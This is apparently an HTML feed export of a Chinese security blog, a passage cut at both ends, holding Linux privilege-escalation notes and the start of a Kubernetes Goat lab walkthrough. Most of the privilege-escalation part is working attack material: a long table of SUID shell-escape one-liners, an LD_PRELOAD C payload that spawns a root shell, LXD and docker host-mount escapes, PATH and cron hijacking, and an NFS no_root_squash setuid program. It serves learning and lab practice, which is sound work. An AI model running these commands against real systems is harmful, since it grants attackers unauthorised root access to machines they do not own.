class="language-bash">查看所有特权</span></span><br><span class="line">getcap -r / 2&gt;/dev/null</span><br><span class="line">/sbin/getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>1，SUID利用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp $(which php) .</span><br><span class="line">sudo setcap cap_setuid+ep php</span><br><span class="line"></span><br><span class="line">./php -r &quot;posix_setuid(0); system(&#x27;/bin/sh&#x27;);&quot;</span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-05%20235807.png"><br>前者为程序，后者为特权，如果特权足够大，将会导致提权<br>2，进程注入<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-06%20001125.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usr/bin/python2.7 = cap_sys_ptrace+ep</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">cap_sys_ptrace表示允许跟踪进程</span></span><br></pre></td></tr></table></figure><p>利用方法：<br>利用usr&#x2F;bin&#x2F;python2.7去跟踪一个root权限的进程，来获取权限<br>所以需要写一个进程注入脚本</p><h2 id="LD-Preload加载"><a href="#LD-Preload加载" class="headerlink" title="LD_Preload加载"></a>LD_Preload加载</h2><p>LD_Preload是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序前优先加载的动态链接库，所谓的动态链接库其实就是DLL文件（linux为SO文件）<br>利用原理：<br>因为允许你定义在程序前优先加载的动态链接库，所以自己写一个so文件，让其加载</p><p>在etc&#x2F;sudoers文件中存在两个信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DEfaults        env_keep += LD_PRELOAD  #设置LD_Preload权限的开启</span><br><span class="line">test    ALL=(ALL:ALL) NOPASSWD: /usr/bin/find   #普通用户sudo的执行权限</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：这里&#x2F;usr&#x2F;bin&#x2F;find可以是任何文件，也可能是第三方文件，如果真是find，那么就不会用到此提权手法了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shell.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _init()&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">同样在Windows操作系统中使用.dll文件</span></span><br><span class="line">ls -al shell.so</span><br><span class="line">sudo LD_PRELOAD=/tmp/shell.so find</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">让find执行时绑定shell.so</span></span><br><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p>相当于sudo提权的升级版</p><h2 id="LXD容器"><a href="#LXD容器" class="headerlink" title="LXD容器"></a>LXD容器</h2><p>原理：<br>LXD是基于LXC容器的管理程序，当前用户可操作容器，<br>理解为用户创建一个容器，再用容器挂载宿主机磁盘，<br>最后使用容器权限操作宿主机磁盘内容达到提权效果。<br>LXD提权条件：</p><ul><li>已经获得shell</li><li>用户属于LXD组<br>利用手法：<br>创建容器，挂载磁盘，进入容器，进入目录提权</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">向被攻击机传入镜像alpine-v3.13.x86_64-20210218_0139.tar.gz，如果有网可直接在shell中拉取</span></span><br><span class="line">lxc image import ./alpine-v3.13.x86_64-20210218_0139.tar.gz --alias test</span><br><span class="line">lxc init test test -c security.privileged=true</span><br><span class="line">lxc config device add test test disk source=/ path=/mnt/root recursive=true</span><br><span class="line">lxc start test</span><br><span class="line">lxc exec test /bin/sh</span><br><span class="line">cd /mnt/root/root</span><br></pre></td></tr></table></figure><h2 id="docker容器"><a href="#docker容器" class="headerlink" title="docker容器"></a>docker容器</h2><p>提权条件：</p><ul><li>获得shell</li><li>用户属于docker组<br>创建容器，挂载磁盘，进入容器，进入目录提权</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/mnt -it alpine #随便拉一个镜像</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第一个/ 表示真机的根目录</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/mnt表示虚拟机目录</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/:/mnt表示将真机的根目录放到虚拟机的/mnt目录下</span></span><br><span class="line">cd /mnt/root</span><br></pre></td></tr></table></figure><h2 id="rbash绕过"><a href="#rbash绕过" class="headerlink" title="rbash绕过"></a>rbash绕过</h2><p><a href="https://www.cnblogs.com/yuy0ung/articles/18305203">https://www.cnblogs.com/yuy0ung/articles/18305203</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux提权-1</title>
      <link href="/2025/06/17/linux%E6%8F%90%E6%9D%83-1/"/>
      <url>/2025/06/17/linux%E6%8F%90%E6%9D%83-1/</url>
      
        <content type="html"><![CDATA[<h1 id="linux提权-1"><a href="#linux提权-1" class="headerlink" title="linux提权-1"></a>linux提权-1</h1><p>《Linux提权方法论》<br><a href="https://github.com/Getshell/LinuxTQ">https://github.com/Getshell/LinuxTQ</a><br>提权网站：<br><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a><br><a href="https://xz.aliyun.com/news/11110">https://xz.aliyun.com/news/11110</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>当前主机的操作系统</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hostnamectl</span><br><span class="line">cat /etc/*-release</span><br><span class="line">lsb_release -a </span><br><span class="line">cat /etc/lsb-release # Debain</span><br><span class="line">cat /etc/redhat-release # Redhat</span><br><span class="line">cat /etc/centos-release  # Centos</span><br><span class="line">cat /etc/os-release  # Ubuntu</span><br><span class="line">cat /etc/issue</span><br></pre></td></tr></table></figure><p>当前主机的内核版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hostnamectl</span><br><span class="line">uname -a </span><br><span class="line">cat /proc/version</span><br><span class="line">dmesg | grep &quot;Linux version&quot;</span><br></pre></td></tr></table></figure><p>内核漏洞筛选：<br>MSF检测：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/recon/local_exploit_suggester</span><br></pre></td></tr></table></figure><p>提权脚本:<br><a href="https://github.com/liamg/traitor">https://github.com/liamg/traitor</a><br><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">https://github.com/The-Z-Labs/linux-exploit-suggester</a></p><p>综合脚本：<br><a href="https://github.com/peass-ng/PEASS-ng">https://github.com/peass-ng/PEASS-ng</a><br><a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></p><h2 id="1，SUID提权"><a href="#1，SUID提权" class="headerlink" title="1，SUID提权"></a>1，SUID提权</h2><p>SUID(Set ownerUserIDupon execution)是给予文件的一个特殊类型的文件权限。在Linux&#x2F;Unix中，当一个程序运行的时候，程序将从登录用户处继承权限。<br>SUID被定义为给予一个用户临时的（程序&#x2F;文件）所有者的权限来运行一个程序&#x2F;文件。用户在执行程序&#x2F;文件&#x2F;命令的时候，将获取文件所有者的权限以及所有者的UID和GID。</p><p>查看文件是否具有SUID属性</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -al file(此为要查询的文件名)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如查看<span class="built_in">sudo</span>文件的SUID属性</span></span><br><span class="line">ls -al /usr/bin/sudo</span><br></pre></td></tr></table></figure><p>SUID提权利用原理<br>SUID(Set User ID)是对二进制程序进行的一种特殊权限设置，可以让二进制程序的执行者临时拥有文件属主的权限，也正是因为这个特性，假设我们以非 root 用户身份访问目标系统，并且我们发现启用了 suid 位的二进制文件，那么这些文件&#x2F;程序&#x2F;命令可以以 root 权限运行。</p><p>如何查找 SUID 文件<br>查找当前用户可利用的具有SUID的属性的质量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">参数：</span><br><span class="line">/表示从文件系统的顶部（根）开始，查找每个目录</span><br><span class="line">-perm表示搜索后面的权限</span><br><span class="line">-u=s表示查找 root 用户拥有的文件</span><br><span class="line">-type表示我们正在寻找的文件类型</span><br><span class="line">f 表示普通文件，而不是目录或特殊文件</span><br><span class="line">2表示到进程的第二个文件描述符，即 stderr（标准错误）</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">表示重定向</span></span><br><span class="line">/dev/null是一个特殊的文件系统对象，它会丢弃写入其中的所有内容</span><br></pre></td></tr></table></figure><h3 id="常用指令提权方法"><a href="#常用指令提权方法" class="headerlink" title="常用指令提权方法:"></a><strong>常用指令提权方法:</strong></h3><table><thead><tr><th>命令</th><th>利用方法</th></tr></thead><tbody><tr><td>zsh</td><td>zsh</td></tr><tr><td>xargs</td><td>xargs -a &#x2F;dev&#x2F;null sh -p</td></tr><tr><td>watch</td><td>watch -x sh -c ‘reset; exec sh -p 1&gt;&amp;0 2&gt;&amp;0’</td></tr><tr><td>timeout</td><td>timeout 7d &#x2F;bin&#x2F;sh -p</td></tr><tr><td>time</td><td>time &#x2F;bin&#x2F;sh -p</td></tr><tr><td>tclsh</td><td>1、tclsh 2、exec &#x2F;bin&#x2F;sh -p &lt;@stdin &gt;@stdout2&gt;@stderr</td></tr><tr><td>taskset</td><td>taskset 1 &#x2F;bin&#x2F;sh -p</td></tr><tr><td>stdbuf</td><td>stdbuf -i0 &#x2F;bin&#x2F;sh -p</td></tr><tr><td>strace</td><td>strace -o &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh -p</td></tr><tr><td>ssh</td><td>ssh -o ProxyCommand&#x3D;’;sh -p 0&lt;&amp;2 1&gt;&amp;2’ x</td></tr><tr><td>setarch</td><td>setarch $(arch) &#x2F;bin&#x2F;sh -p</td></tr><tr><td>rsync</td><td>rsync -e ‘sh -p -c “sh -p 0&lt;&amp;2 1&gt;&amp;2”’ 127.0.0.1:&#x2F;dev&#x2F;null</td></tr><tr><td>rpm</td><td>rpm –eval ‘%{lua:os.execute(“&#x2F;bin&#x2F;sh -p”)}’</td></tr><tr><td>python</td><td>python -c ‘import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-p”)’</td></tr><tr><td>php</td><td>1、CMD&#x3D;”&#x2F;bin&#x2F;sh” 2、 php -r “pcntl_exec(‘&#x2F;bin&#x2F;sh’, [‘-p’]);”</td></tr><tr><td>nice</td><td>nice &#x2F;bin&#x2F;sh -p</td></tr><tr><td>nano</td><td>1、nano &#x2F;&#x2F;运行nano程序 2、^R &#x2F;&#x2F;按下ctrl-r 3、^X &#x2F;&#x2F;按下ctrl-x 4、reset; sh -p 1&gt;&amp;0 2&gt;&amp;0 &#x2F;&#x2F;输入下面的命令</td></tr><tr><td>more</td><td>1、more &#x2F;etc&#x2F;profile 2、!&#x2F;bin&#x2F;sh -p</td></tr><tr><td>logsave</td><td>logsave &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh -i -p</td></tr><tr><td>less</td><td>less &#x2F;etc&#x2F;profile &#x2F;&#x2F;读取文件，在底行输入!&#x2F;bin&#x2F;sh -p</td></tr><tr><td>ksh</td><td>ksh -p</td></tr><tr><td>ip</td><td>1、ip netns add foo 2、ip netns exec foo &#x2F;bin&#x2F;sh -p 3、ip netns delete foo</td></tr><tr><td>ionice</td><td>ionice &#x2F;bin&#x2F;sh -p</td></tr><tr><td>git</td><td>git help status</td></tr><tr><td>gimp</td><td>gimp -idf –batch-interpreter&#x3D;python-fu-eval -b ‘import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-p”)’</td></tr><tr><td>gdb</td><td>gdb -nx -ex ‘python import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-p”)’ -ex quit</td></tr><tr><td>ftp</td><td>ftp &#x2F;&#x2F;在底行输入”!&#x2F;bin&#x2F;sh -p”</td></tr><tr><td>flock</td><td>flock -u &#x2F; &#x2F;bin&#x2F;sh -p</td></tr><tr><td>find</td><td>find . &#x2F; -exec “&#x2F;bin&#x2F;sh” -p</td></tr><tr><td>expect</td><td>expect -c ‘spawn &#x2F;bin&#x2F;sh -p;interact’</td></tr><tr><td>env</td><td>env &#x2F;bin&#x2F;sh -p</td></tr><tr><td>ed</td><td>ed &#x2F;&#x2F;在底行输入”!&#x2F;bin&#x2F;sh -p”</td></tr><tr><td>docker</td><td>docker run -v &#x2F;:&#x2F;mnt –rm -it alpine chroot &#x2F;mnt sh</td></tr><tr><td>dmesg</td><td>dmesg -H&#x2F;&#x2F;在底行输入”!&#x2F;bin&#x2F;sh -p”</td></tr><tr><td>csh</td><td>csh -b</td></tr><tr><td>bash</td><td>bash -p</td></tr><tr><td>awk</td><td>awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash -p”)}’</td></tr><tr><td>perl</td><td>perl exec “&#x2F;bin&#x2F;bash”;</td></tr><tr><td>Vi&#x2F;Vim</td><td>vim.basic &#x2F;etc&#x2F;passwd 添加一个新的用户条目或修改现有用户条目的密码哈希，然后保存并退出。格式：newuser:$6$salt$hash:uid:gid:GECOS:home:shell 保存修改后的&#x2F;etc&#x2F;passwd文件，并以新用户身份登录或使用su命令切换到新用户。</td></tr><tr><td>cp</td><td>cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;bash &#x2F;&#x2F;覆盖&#x2F;bin&#x2F;bash来创建一个后门 ;chmod u+s &#x2F;tmp&#x2F;bash;执行&#x2F;tmp&#x2F;bash -p可以获取一个root权限的shell</td></tr></tbody></table><p>确定要用的指令(以gdb为例)，并输入利用指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit</span><br></pre></td></tr></table></figure><h2 id="2，SUDO提权"><a href="#2，SUDO提权" class="headerlink" title="2，SUDO提权"></a>2，SUDO提权</h2><p>SUDO权限是root把本来只能超级用户执行的命令赋予普通用户执行，系统管理员集中的管理用户使用权限和使用主机，配置文件：&#x2F;etc&#x2F;sudoers</p><h2 id="3，PATH提权"><a href="#3，PATH提权" class="headerlink" title="3，PATH提权"></a>3，PATH提权</h2><p>需要结合SUID提权<br>以一个靶场为例：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-04%20221045.png"><br>当那些shell后，查找SUID存在第三方文件<br>&#x2F;opt&#x2F;statuscheck</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span>s /opt/statuscheck <span class="comment">//查看文件中含有的字符串</span></span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-04%20221553.png"><br>&#x2F;opt&#x2F;statuscheck存在执行<br>利用方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/sh&quot; &gt; curl  # 在tmp目录下创建curl文件，包含“/bin/sh”</span><br><span class="line">chmod 777 curl  # 赋予权限</span><br><span class="line">export PATH=/tmp:$PATH  # 将/tmp添加到环境变量中，可以让系统不会执行默认的curl工具</span><br><span class="line">echo $PATH</span><br><span class="line">/opt/statuscheck   #执行文件触发curl</span><br></pre></td></tr></table></figure><p>根据此靶场就好理解了，将原生的内容劫持后，执行自己添加的到环境的内容</p><h2 id="4，PATH劫持"><a href="#4，PATH劫持" class="headerlink" title="4，PATH劫持"></a>4，PATH劫持</h2><p>查看定时任务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure><p>发现定义了诸多环境变量，如果其任务有 未指定绝对路径的指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@izjf ~]# cat /etc/crontab</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATTH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">MAILTO=root</span><br></pre></td></tr></table></figure><p>发现定义了诸多环境变量，如果其任务有 未指定绝对路径的指令，如</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*    * * *   root    <span class="keyword">shell</span>.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure><p>而且我们在其环境变量路径中可以进行写入操作，那么我们可以通过写入环境变量的靠前路径一个同名恶意文件从而导致环境变量劫持。</p><p>找到可写目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>比如在 &#x2F;sbin 写入一个 反弹 shell 功能的 shell.sh，那么就可以造成提权。</p><h2 id="4，定时任务提权"><a href="#4，定时任务提权" class="headerlink" title="4，定时任务提权"></a>4，定时任务提权</h2><p>定时任务（cron job）可以用来设置周期执行的命令，提权的原理为计划任务以root权限运行，计划任务中的脚本其他用户有写入的权限，或者脚本所属组为其他用户，则可以进行计划任务提权。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/cron*</span><br></pre></td></tr></table></figure><p>如果我们有幸有权限能更改其中一个任务指定的脚本，就可以往脚本里添加如反弹 shell 等指令，从而提权.</p><h2 id="5，NFS提权"><a href="#5，NFS提权" class="headerlink" title="5，NFS提权"></a>5，NFS提权</h2><p>NFS 是一种运行在端口 2049 上的网络文件共享协议，由服务器和客户端两个组件组成。共享目录是在 NFS 服务器上创建的，以便可以通过网络与其他 Linux 客户端共享文件，获得许可的用户可以将文件添加到共享中，然后与有权访问该目录的其他用户共享。</p><p>默认情况下，每个 NFS 共享均启用了 root_squash 功能，用以防止被共享的文件拥有 root:root 身份或特殊权限（即启用 root_squash 之后，共享文件均是 nobody:nogroup 身份）。而如果启用了 no_root_squash 功能，那么共享文件就可以以 root 的身份存在，我们将在本篇文章中看到，这很容易导致权限升级。</p><p>枚举 NFS 共享：<br>1，使用 Nmap 枚举 NFS 共享<br>2，使用 showmount 命令进行枚举</p><p>挂载 NFS 共享：<br>我们需要做的第一件事是在攻击者机器上创建一个挂载点，以便与共享进行交互。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /mnt/nfs</span><br></pre></td></tr></table></figure><p>创建挂载点后，我们就可以挂载共享并将其链接到挂载点。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs 192.168.1.5:/mnt/nfs ./nfs  #攻击机执行</span><br></pre></td></tr></table></figure><p>成功后，只要往本机的nfs文件放内容，对方的nfs上也会实时同步<br>利用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(root@kali)-[~/nfs]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cp</span> /usr/bin/find shell //将find命令拷贝到shell中</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">chmod</span> 777 shell//赋予权限</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">chmod</span> +s shell//赋予suid权限</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/mnt/nfs/shell . / -exec &quot;/bin/sh&quot; -p;quit //进行提权</span><br></pre></td></tr></table></figure><p>注意：系统不同find命令也会不同，导致运行出错<br>解决：<br>1，用相同的系统拷贝&#x2F;usr&#x2F;bin&#x2F;find<br>2，写一个c语言进行调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shell.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stido.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将shell.c编译成可执行文件，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc shell.c -o getshell</span><br></pre></td></tr></table></figure><p>赋SUID权限，再传入nfs中。</p><p>python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/usr/<span class="built_in">bin</span>/python3</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">        os.system(<span class="string">&quot;thm&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kubernetes-goat靶场</title>
      <link href="/2025/06/17/kubernetes-goat%E9%9D%B6%E5%9C%BA/"/>
      <url>/2025/06/17/kubernetes-goat%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="kubernetes-goat靶场"><a href="#kubernetes-goat靶场" class="headerlink" title="kubernetes-goat靶场"></a>kubernetes-goat靶场</h1><p>Kubernetes Goat 被设计成一个故意设置易受攻击的集群环境，用于学习和实践 Kubernetes 安全性</p><p>安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/madhuakula/kubernetes-goat.git</span><br><span class="line">cd kubernetes-goat</span><br><span class="line">chmod +x setup-kubernetes-goat.sh</span><br><span class="line">bash setup-kubernetes-goat.sh</span><br></pre></td></tr></table></figure><p>运行访问脚本之前，确保 Pod 正在运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods</span><br></pre></td></tr></table></figure><p>通过以下命令将资源公开到本地系统（端口转发）来访问 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash access-kubernetes-goat.sh</span><br></pre></td></tr></table></figure><h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><ul><li>1.代码库中的敏感密钥</li><li>2.IND（docker-in-docker）利用</li><li>3.Kubernetes（K8S）世界中的SSRF</li><li>4.容器逃逸到主机系统</li><li>5.Docker CIS 基准分析</li><li>6.Kubernetes CIS 基准分析</li><li>7.攻击私人注册中心</li><li>8.NodePort 暴露服务</li><li>9.使用 Helm v2 Tiller 来攻克集群 - [已弃用]</li><li>10.分析加密货币矿工容器</li><li>11.Kubernetes 命名空间绕过</li><li>12.获取环境信息</li><li>13.对内存&#x2F;CPU 资源进行 DoS</li><li>14.黑客容器预览</li><li>15.层层隐藏</li><li>16.RBAC 最小权限配置错误</li><li>17.KubeAudit - 审计 Kubernetes 集群</li><li>18.Falco - 运行时安全监控和检测</li><li>19.Popeye - Kubernetes 集群清理工具</li><li>20.使用 NSP 保护网络边界</li><li>21.Cilium Tetragon - 基于 eBPF 的安全可观察性和运行时执行</li><li>22.使用 Kyverno 策略引擎保护 Kubernetes 集群</li></ul><p>参考：<a href="https://madhuakula.com/kubernetes-goat">https://madhuakula.com/kubernetes-goat</a></p><h2 id="一，代码库中的敏感密钥"><a href="#一，代码库中的敏感密钥" class="headerlink" title="一，代码库中的敏感密钥"></a>一，代码库中的敏感密钥</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>开发人员倾向于将敏感信息提交给版本控制系统。当我们转向 CI&#x2F;CD 和 GitOps 系统时，我们往往会忘记识别代码和提交中的敏感信息。让我们看看能不能在这里找到一些很酷的东西！<br>访问1230端口。</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-20%20204507.png"></p><p>使用gobuster爆破目录，找到&#x2F;.git&#x2F;HEAD</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line"><span class="section">└─# gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 30 -u http://127.0.0.1:1230</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.1.0</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.32.130:1230</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 